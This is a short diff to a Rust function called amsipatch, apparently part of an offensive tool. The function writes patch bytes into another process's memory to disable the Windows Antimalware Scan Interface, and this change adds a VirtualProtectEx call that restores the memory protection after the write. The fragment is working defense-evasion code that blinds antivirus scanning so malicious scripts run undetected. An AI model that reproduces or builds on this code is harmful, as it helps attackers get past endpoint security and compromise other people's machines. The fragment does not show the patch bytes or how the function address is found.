@@ -44,6 +44,9 @@ pub fn amsipatch(pid: usize) -> Result<String,String>{
                                 (*v as usize + *funcaddress) as *mut c_void, 
                                 patch.as_ptr() as *const c_void, 
                                 8, &mut byteswritten);
+                        VirtualProtectEx(prochandle, 
+                                    (*v as usize + *funcaddress) as *mut c_void, 
+                                    5, oldprotect, &mut oldprotect);
                         if res==0{
                             CloseHandle(prochandle);
                             return Err(format!("writeprocessmemory failed: {}",GetLastError()));
@@ -63,5 +66,4 @@ pub fn amsipatch(pid: usize) -> Result<String,String>{
 
     }
 }
-
 
